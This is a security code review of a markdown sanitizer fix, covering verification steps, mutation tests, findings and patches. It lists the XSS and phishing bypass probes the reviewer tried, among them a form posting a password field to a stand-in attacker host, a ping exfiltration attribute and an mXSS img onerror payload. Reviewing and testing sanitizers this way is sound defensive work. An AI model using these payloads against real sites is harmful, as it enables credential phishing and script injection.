# Code Review — issue #195, markdown sanitizer hardening

**Branch:** `markdown-sanitize`
**Range reviewed:** `7a0f220..204af7e` (fix commit `25bab77`, docs commit `204af7e`)
**Reviewer:** independent review. The developer's report at
`reports/dev-markdown-sanitize.md` was read but **not** ratified — every load-bearing
claim below was re-executed locally against the committed tree.

> **Note on the report's two mis-stated explanations.** An EM correction notice was
> appended to `dev-markdown-sanitize.md` while this review was in progress, flagging the
> mXSS mechanism and the DOMPurify no-DOM failure mode as wrongly explained. I did not
> adopt that notice either — I re-derived both from scratch with discriminating
> experiments. **Both corrections are right**, and my own first draft had repeated the
> foster-parenting explanation uncritically before I tested it. Full derivations are in
> Positive Feedback. Neither affects the verdict: the *tests* the report produced are
> correct, only its account of why.

---

## Executive Summary

This is a small, well-scoped, correctly implemented security fix: it closes a real
credential-phishing vector in attacker-controlled markdown and adds the first test
coverage this security boundary has ever had. Risk of the change itself is **low** —
the diff touches one 35-line module plus test harness wiring, introduces no runtime
dependency, and I independently confirmed that non-task-list markdown output is
byte-identical to the pre-change pipeline.

**Verdict: APPROVE** — with two Medium findings recommended for a short cleanup
commit on this branch before merge. Neither reopens the reported vulnerability.

---

## Verification Performed (independent, not taken from the report)

| Check | Command / method | Result |
|---|---|---|
| Commit range | `git log --oneline 7a0f220..HEAD` | 2 commits, matches brief |
| Dependency versions | `node -e require(...)` | marked 15.0.12, dompurify 3.4.12, jsdom 29.1.1 |
| Test suite | `npm ci && npm test` | `markdown sanitizer: 32 checks passed` |
| Typecheck (app) | `npx tsc --noEmit` | clean |
| Typecheck (tests) | `npx tsc -p tsconfig.test.json --noEmit` | clean |
| Bundle build | `npm run build` | ✓ 341 modules, hash `index-DkAVF9N3.js` reproduces the report's |
| Dep audit | `npm audit --audit-level=low` | 0 vulnerabilities |
| Go build | `go build ./...` (repo root) | clean |
| Go tests | `go test ./...` | 1 failure, pre-existing — see Informational |
| Mutation 1 (drop FORBID config) | re-run by me | **8 of 32 failed** — matches report exactly |
| Mutation 2 (drop `DOMPurify.sanitize`) | re-run by me | **20 of 32 failed** — matches report exactly |
| Mutation 3 (drop checkbox renderer) — *my addition* | re-run by me | 2 of 32 failed |
| Mutation 4 (renderer ignores `checked`) — *my addition* | re-run by me | 2 of 32 failed |
| mXSS mechanism — *my addition* | 4 discriminating variants | report's explanation disproved; see Positive Feedback |
| DOMPurify no-DOM mode — *my addition* | import with no `window` | throws `TypeError`, does not pass through |
| Bypass probes — *my addition* | 24 payloads (case, SVG/MathML ns, `contenteditable`, `ping`, `dialog`) | 23 blocked, 1 finding (M1) |
| Old-vs-new output parity — *my addition* | 23-case markdown corpus | identical except the 5 task-list cases |

Mutations 3 and 4 were not in the developer's report. I added them because the two
task-list assertions are the only thing pinning the new renderer, and I wanted to
confirm they are load-bearing rather than incidentally satisfied. They are.

---

## Focus Area 1 — `marked` singleton → private `new Marked({...})`

`web/src/util/markdown.ts:1,23-28`

**Correct, and I confirm it changes behaviour for no existing caller.**

- `grep -rn "from 'marked'" web/src` returns exactly one hit: `markdown.ts:1`. There is
  no other importer, no `marked.use()`, and no `marked.setOptions()` anywhere in the
  repository. So "does not mutate global state for a future caller" is a forward-looking
  argument, not a present-tense one — but the choice is still the right one and costs
  nothing.
- `renderMarkdown` has exactly two call sites (`ft-inspector-desc.ts:233`,
  `ft-inspector-comments.ts:221`), both via `unsafeHTML`. There are no other
  `unsafeHTML`/`innerHTML` sinks in `web/src`. The sanitizer is genuinely the single
  boundary, and this change covers all of it.
- I verified the "byte-identical output" claim directly rather than accepting it. I ran a
  23-case corpus (headings, emphasis, strikethrough, links, images, fenced and inline
  code, ordered/unordered/loose lists, blockquotes, tables, HR, footnotes, autolinks,
  raw inline HTML, hard-wrap paragraphs) through both the old
  `DOMPurify.sanitize(marked.parse(md))` and the new pipeline. **The only diffs are the
  five task-list cases.** Everything else is byte-for-byte identical, both pre- and
  post-sanitize. The claim holds.
- marked 15's `Marked` constructor forwards to `use()`, so a partial `renderer` object
  merges onto the defaults rather than replacing them. Confirmed empirically by the corpus
  above (tables, code fences, footnotes all still render).

No finding.

## Focus Area 2 — the checkbox renderer override

`web/src/util/markdown.ts:23-28`

**The reasoning is sound and I could not find attacker-controlled data reaching it.**

- Signature is correct for the installed major: `node_modules/marked/lib/marked.d.ts:181`
  declares `checkbox({ checked }: Tokens.Checkbox): string`. (This is version-sensitive —
  marked ≤11 passed a bare boolean, and destructuring that would have silently produced
  `undefined` and rendered every box unchecked. It does not here; mutation 4 proves the
  state bit is live.)
- Call site is `marked.cjs:1519`: `this.checkbox({ checked: !!item.checked })`. The double
  negation guarantees a boolean, `Tokens.Checkbox` has no other field, and the renderer's
  output is two constant strings selected by that boolean. **No attacker string can reach
  the template literal.** Verified.
- The substituted HTML is spliced into the list-item token with `escaped: true`
  (`marked.cjs:1522-1536`), so it is not double-escaped, and it then passes DOMPurify
  as an allowlisted `<span class>`. Confirmed by output.
- The "substitute before DOMPurify, never widen the allowlist" argument is the right
  trade against the rejected `afterSanitizeAttributes` hook alternative. I agree with the
  rejection: DOMPurify hooks register on the singleton and are global, which would have
  been a worse coupling than the one being avoided in Focus Area 1.
- I confirmed the pre-change behaviour to check the premise was real:
  `DOMPurify.sanitize(marked.parse('- [x] done'))` on the base pipeline emits
  `<input checked="" disabled="" type="checkbox">` — so `input` really was allowed by
  default, and forbidding it really would have flattened checked/unchecked. The
  justification is not manufactured.

Two findings (M2, L2 below), neither about correctness.

## Focus Area 3 — `FORBID_TAGS` / `FORBID_ATTR`

`web/src/util/markdown.ts:11,16`

I probed the sanitizer with 24 bypass attempts of my own, independent of the test file.
Everything the PR claims to block, it blocks — including case variants and namespace
confusion, which the test suite does not cover:

```
<FORM ACTION="https://evil.example"><INPUT TYPE=password></FORM>   => ""
<svg><foreignObject><form …><input type=password></svg>            => "<p><svg></svg></p>"
<math><annotation-xml encoding="text/html"><form …>                => "<p><math></math></p>"
<div STYLE="position:fixed">x</div>                                => "<div>x</div>"
<a href="…" DOWNLOAD="a.exe">dl</a>                                => "<a href="…">dl</a>"
<div contenteditable="true">type password</div>                    => "<div>type password</div>"
<a href="…" ping="https://evil.example">                           => ping dropped
```

`contenteditable`, `ping`, `target` and `autofocus` are dropped by DOMPurify's defaults,
so the config is not carrying them — but they are dropped, which matters for the
completeness question.

**Not over-broad.** None of the six forbidden tags or four forbidden attributes appear in
any output marked can generate from ordinary markdown. The only collateral is the
task-list `<input>`, which is handled.

**Not quite sufficient** — see M1.

**Config safety:** I checked two things the report did not. (a) `DOMPurify.sanitize` is
called with a config object on every invocation, so there is no config-persistence
hazard — I confirmed a subsequent default-config call is unaffected. (b) DOMPurify
3.4.12's `addToSet` (`purify.cjs.js:147`) applies `setPrototypeOf(set, null)` to the
internal set, **not** to the caller's array, and the in-place lowercasing branch never
fires because all entries are already lowercase. The module-level constant arrays are
not mutated across calls. `Object.getPrototypeOf(FORBID_TAGS) === Array.prototype` after
sanitizing. No aliasing bug.

## Focus Area 4 — collateral damage

**The report's claim is correct, and I verified it independently rather than by eye.**

- `grep -rn 'style="' web/src` returns 21 hits. Every single one is inside a Lit
  `html\`\`` template (`ft-inspector-comments.ts:203,215`, `ft-inspector-meta.ts:523`,
  `ft-task-card.ts:422`, `ft-tree-node.ts:189`, `ft-ready-queue-view.ts:335`, etc.).
  None is in a string that ever passes through `renderMarkdown`. `FORBID_ATTR`
  operates only on the sanitized markdown string, so the `sl-avatar`
  `style="--size: 1.4rem; …"` at `ft-inspector-comments.ts:215` is structurally
  unreachable by it. Claim verified.
- Both sinks are `LitElement` subclasses with `static styles` and **no
  `createRenderRoot()` override**, so markdown renders inside a shadow root. Global
  application CSS therefore cannot be targeted by attacker `class` attributes — this
  meaningfully limits the residual class-spoofing surface, and it is worth recording
  because it is load-bearing for L4 below. Neither the report nor the code comments
  mention it.
- Provenance claim verified at source: `internal/platform/github/github.go:163`,
  `Description: issue.GetBody()`. The threat model in the header comment is accurate.
- `web/.tmp-test/` is already gitignored (`.gitignore:46`); `web/dist/` is untracked. No
  build artefacts leak into the commit.
- `package-lock.json` diff is +578 lines, all of which resolve to jsdom's dev subtree
  (`parse5`, `tough-cookie`, `undici`, `css-tree`, …). Nothing enters `dependencies`;
  the shipped bundle is unaffected. The report's conflict warning for other in-flight
  branches is fair.

---

## Critical Issues

**None.**

---

## Findings

### M1 — Medium — `<dialog>` survives and reopens the overlay-spoofing vector that `FORBID_ATTR: ['style']` was added to close

`web/src/util/markdown.ts:11` (and `:13`, whose comment states the intent)

Line 13 documents the purpose of forbidding `style` as *"enables overlay and layout
spoofing of the surrounding UI."* That mitigation is incomplete: `<dialog>` is in
DOMPurify's default allowlist and survives, as does its `open` attribute. I confirmed:

```
in : <dialog open>modal</dialog>
out: <dialog open="">x</dialog>
```

Per the HTML Standard's default rendering rules, a non-modal `dialog` carries
`position: absolute; inset-inline-start: 0; inset-inline-end: 0; margin: auto;
border: solid; padding: 1em; background-color: Canvas`. That hands an attacker an
absolutely-positioned, auto-centred, **opaque-background** box out of the normal flow —
the exact primitive `style` was forbidden to deny — with no `style` attribute required.
Combined with the surviving text content this is a usable fake-modal.

Severity is Medium rather than High because the shadow-root boundary constrains
positioning context and, with all form controls stripped, the fake modal cannot capture
input — only mislead, and link out. It does not reopen issue #195 itself. But it
partially defeats a control this PR deliberately added, and the fix is one word.

**Suggested fix** (`markdown.ts:11`):

```ts
const FORBID_TAGS = [
  'form', 'input', 'button', 'select', 'textarea', 'option', 'dialog',
];
```

I verified this is effective: with `dialog` added, `<dialog open>x</dialog>` sanitizes to
`"x"`. Add a matching assertion to the spoofing section of `markdown.test.ts:118-137`:

```ts
check('dialog stripped (no fake modal)', () => {
  const out = renderMarkdown('<dialog open>Enter your password</dialog>');
  assertNoElement(out, 'dialog', 'dialog survived');
  assertContains(out, 'Enter your password', 'content should be preserved');
});
```

### M2 — Medium — the glyph substitution drops the assistive-technology semantics the `<input>` carried

`web/src/util/markdown.ts:25-26`

Pre-change, marked emitted `<input checked="" disabled="" type="checkbox">`, which
survived sanitization (I confirmed this on the base pipeline) and is announced by screen
readers as a checkbox with an explicit checked/unchecked state. Post-change the output is
a bare `<span class="ft-task-checkbox">☑</span>` with no role and no accessible name.

I want to be precise about the impact rather than overstate it: NVDA and JAWS generally
*do* announce U+2611/U+2610 by Unicode name ("ballot box with check"), so this is
degradation rather than total loss. But it is verbosity-setting-dependent, it is not a
checkbox role, and — by the report's own argument for why this substitution was worth
doing at all — the checked bit is the one piece of information the syntax exists to
carry. The same reasoning that justifies preserving it visually justifies preserving it
semantically.

This is a regression introduced by this PR, not a pre-existing condition.

**Suggested fix.** I verified DOMPurify retains `role` and `aria-label` under the exact
config in this file (`<span class="c" role="img" aria-label="completed">☑</span>` passes
through unmodified), so this needs no allowlist change:

```ts
const parser = new Marked({
  renderer: {
    checkbox: ({ checked }: Tokens.Checkbox): string =>
      checked
        ? '<span class="ft-task-checkbox" role="img" aria-label="Completed">☑︎</span>'
        : '<span class="ft-task-checkbox" role="img" aria-label="Not completed">☐︎</span>',
  },
});
```

(The `︎` variation selector also addresses L2.) The two existing task-list
assertions at `markdown.test.ts:293-308` assert on `'☑'` / `'☑</span> outer'` and would
need updating to match; extend one of them to assert the `aria-label` so the semantics
are pinned too.

### L1 — Low — `@types/jsdom@^28` is a major behind `jsdom@^29`

`web/package.json:23-24`

```json
"@types/jsdom": "^28.0.3",
"jsdom": "^29.1.1",
```

jsdom 29.1.1 ships no bundled typings (`types: none` in its `package.json`), so
`@types/jsdom` is genuinely required — but pinning the types package a major version
behind the runtime means the declared API can drift from the real one. `tsc` is clean
today because the test uses only `new JSDOM('')` and `.window`, which is stable across
both. Worth a note in case the harness grows.

**Suggested fix:** track whether `@types/jsdom@29` exists yet; if not, add a one-line
comment recording the deliberate skew so a future reader does not "fix" it blindly.

### L2 — Low — `☑`/`☐` presentation is font- and platform-dependent, and the styling hook is dead

`web/src/util/markdown.ts:26`

`grep -rn "ft-task-checkbox" web/src web/public` returns exactly one hit — the string
literal in `markdown.ts` itself. No stylesheet references the class, confirming the
report. That is fine as a forward hook, but note two rendering consequences:

- U+2610 BALLOT BOX has no emoji presentation but is missing from several common Linux
  font stacks, where it renders as tofu. U+2611 has an emoji variant and may render as a
  colour emoji on some platforms while its unchecked sibling renders as a thin outline —
  visually inconsistent side by side in the same list.
- Appending `︎` (VARIATION SELECTOR-15) forces text presentation and removes the
  inconsistency. Folded into the M2 fix above.

Not blocking; the state *is* distinguishable either way.

### L3 — Low — `action` and `formaction` in `FORBID_ATTR` are unreachable

`web/src/util/markdown.ts:14,16`

Both attributes are only meaningful on `form`, `input` and `button`, all of which are in
`FORBID_TAGS`. My mutation 1 run reproduces the report's observation that the
`formaction` assertion does not fail when the config is reverted — because DOMPurify
strips it by default anyway. There is consequently no input that can distinguish these
two entries being present from being absent, and no test can be written that isolates
them.

I do **not** recommend removing them — the "neither rule is load-bearing" property in the
`:9-10` comment is a deliberate and correct design choice, and the cost is zero. But the
comment at `:14` reads as though these are active controls. Suggest amending to record
that they are unreachable-by-construction redundancy:

```ts
// formaction/action: redirect a submit to an attacker origin. Unreachable while
// form/input/button are in FORBID_TAGS — kept so that neither rule is load-bearing.
```

### L4 — Low — form-adjacent elements outside `FORBID_TAGS` survive

`web/src/util/markdown.ts:11`

`<label>`, `<datalist>`, `<optgroup>`, `<output>`, `<progress>` and `<meter>` all pass:

```
<label>User</label><datalist>x</datalist><optgroup label="g"></optgroup>
<output>x</output><progress value="1"></progress><meter value="1"></meter>
```

`progress` and `meter` render as native platform controls and could contribute to a
convincing fake UI; the rest are inert. None can capture input with `form`/`input`/
`button`/`select`/`textarea` gone, so this is cosmetic only. Note also the small
inconsistency that `option` is forbidden while its parent `optgroup` is not.

I would not expand the list speculatively — but if M1 is taken, `optgroup` is a
zero-cost addition alongside `dialog` for internal consistency.

### L5 — Low — three assertions are raw-substring checks that could false-fail on unrelated content

`web/src/util/markdown.test.ts:114, 135, 214`

`assertNotContains(out, 'formaction')`, `assertNotContains(out, 'download')` and
`assertNotContains(out, 'target')` match anywhere in the output string, including inside
text nodes and hrefs. They are correct for today's fixtures, but a future edit that adds
the word "download" to a fixture's link text would fail the test for the wrong reason.

Deliberately flagging this as Low and **not** recommending conversion to pure DOM
queries. The developer's mutation-2 observation is correct in substance — the mXSS case
(`markdown.test.ts:175-183`) is only caught by the raw-string assertion, and
`assertNoElement(out, 'img')` passes on *unsanitized* input — but see the mechanism
correction in the Positive Feedback section: the cause is more general than the report
originally stated, which makes the dual structural + string assertion *more* important,
not less. It should not be simplified. The three attribute checks above could be
tightened to attribute-presence queries without losing anything, but it is not worth a
round trip.

---

## Informational (not findings against this branch)

- **`go test ./...` fails on `TestWatchTasks_Heartbeat`** (`internal/server/watch_test.go:398`,
  "timed out waiting for event"), reproducibly at `-count=3`. This branch changes **zero**
  Go files (`git diff --name-only 7a0f220..HEAD | grep -c '\.go$'` → `0`), so it is
  definitionally pre-existing. Flagging so it is not mistaken for fallout, and because it
  means the Go suite is currently red on this branch's tip regardless of merge.
- **Source maps in `dist/`** — acknowledged as known and out of scope per the review brief;
  independently confirmed pre-existing and tracked separately. Not counted against this PR.
- The developer's "Found but not fixed" items 2 (no CSP; `form-action 'self'` would
  independently kill this bug class) and 3 (`marked` has no link-scheme allowlist, so
  DOMPurify is a single point of failure for URL safety) are both legitimate and correctly
  scoped out. Recommend they be filed as their own issues rather than left in a report.

---

## Positive Feedback

- **The mutation testing is the best part of this change and it reproduces exactly.** I
  re-ran both mutations blind and got 8/32 and 20/32, matching the report to the failure
  message. The suite is genuinely load-bearing, not decorative — my two additional
  mutations against the new renderer also failed correctly. That is a materially higher
  standard of evidence than most security fixes arrive with.
- **The mXSS false-negative observation is a real and non-obvious catch** — and the
  test it produced is right, even though the report's *explanation* of why is wrong.
  Recognising that `assertNoElement(out, 'img')` passes on the *unsanitized* mglyph
  payload, and then writing both a structural and a raw-string assertion for that reason
  and documenting it, is exactly the care this boundary needs. I have flagged it in L5
  so a future reviewer does not "simplify" it.

  **Mechanism correction (independently reproduced).** A correction notice was added to
  the developer's report while this review was in progress, disputing the stated cause. I
  re-derived it myself rather than adopting either account, and the correction is right:

  ```
  D) <table><img src=1></table>            -> img found? true   html: <img src="1"><table></table>
  A) <img title="--><img src=1 onerror=…>&quot;&gt;   (no MathML, no table)  -> img found? false
  B) <img title="--><img src=1 onerror=…>">          (quote terminated)      -> img found? true
  C) full MathML/table context, quote terminated                             -> img found? true
  ```

  D shows foster-parenting *relocates* the node rather than deleting it, so it cannot be
  the cause. A shows the `<img>` still vanishes with the MathML and table context removed
  entirely. B and C show it reappears the moment the quote is terminated, with or without
  that context. The actual cause is that marked escapes the payload's trailing `">` into
  `&quot;&gt;`, leaving `<img title="` unterminated to EOF, so the tokenizer discards the
  incomplete tag.

  This **strengthens L5 rather than weakening it.** The false-negative hazard is not an
  exotic MathML quirk confined to one fixture — it is a general property of re-parsing any
  truncated or unterminated-attribute markup, and therefore applies to *every* structural
  assertion in the suite. The advice to assert both structurally and on the raw string
  stands and generalises. Note that `markdown.test.ts:175-183` currently carries **no
  inline comment** recording any of this — the reasoning lives only in the report, which
  is where it is least likely to be read by whoever next edits the assertion. Recommend
  (Low, folded into L5) adding a two-line comment above the check stating that the
  structural assertion alone is insufficient because unterminated-attribute markup is
  discarded on re-parse, so both assertion styles must stay.
- **The jsdom-before-import ordering is correct** — the dynamic
  `await import('./markdown.js')` after installing the jsdom globals
  (`markdown.test.ts:11-17`) is necessary and properly done, and mutation 2 is the right
  proof that the DOMPurify binding is live.

  **But the stated justification is wrong, and I confirmed that too.** The report claims
  that without a DOM, DOMPurify "degrades to a pass-through with `isSupported: false`
  … which would have made every assertion vacuously pass." It does not. With no
  `globalThis.window`, DOMPurify 3.4.12's default export is the uninvoked *factory*
  function, so:

  ```
  isSupported: false
  DOMPurify.sanitize('<script>alert(1)</script>')
    -> TypeError: DOMPurify.sanitize is not a function
  ```

  The failure mode is a loud immediate crash, not a silent vacuous pass. The jsdom setup
  is still required for the suite to run at all, so nothing about the code changes — but
  the silent-false-negative hazard it is credited with averting did not exist. This
  matters only because the report is otherwise good enough to be quoted as reference
  material by the next person setting up a DOM-dependent test, and they would be
  designing against a threat that isn't there.
- **Rejecting the `afterSanitizeAttributes` hook alternative was the right call**, and
  for the right reason. DOMPurify hooks are registered globally on the singleton, which
  would have reintroduced precisely the shared-mutable-state coupling that motivated the
  private `Marked` instance. The two decisions in this diff are consistent with each
  other.
- **The threat model is written into the code, not just the commit message.** The header
  comment at `markdown.ts:4-10` names the untrusted source by symbol
  (`IssueToCreateParams`) and explains why each rule exists. I was able to verify the
  provenance claim in under a minute because of it. More security-relevant modules should
  read like this.
- Ordinary-rendering assertions with exact expected strings (`markdown.test.ts:224-284`)
  are the right defence against a sanitizer that silently becomes an outage.

---

## Final Verdict

**APPROVE.**

The reported vulnerability is genuinely fixed, the fix is minimal and idiomatic, the
security posture is strictly better than base, and I could not break it with 24
independent bypass attempts including case-folding and SVG/MathML namespace confusion.
No Critical or High findings.

Recommended for a short cleanup commit on this branch before merge (not a re-review
gate):

1. **M1** — add `dialog` (and `optgroup`) to `FORBID_TAGS` + one test. One word plus five
   lines.
2. **M2** — add `role="img"` / `aria-label` to the checkbox glyphs and `︎` for
   presentation stability; update the two task-list assertions.

L1, L3, L4 and L5 are comment/consistency polish and can ride along or be dropped at the
author's discretion — though the L5 comment at `markdown.test.ts:175` is worth taking,
since that reasoning currently exists nowhere in the code.

Separately, and not a code change: `dev-markdown-sanitize.md` should not be circulated as
reference material until its two mis-stated explanations are struck. I verified both
corrections independently and they hold. The fix and the tests are unaffected.

Please file the CSP gap and the source-map disclosure as their own issues so they acquire
owners.
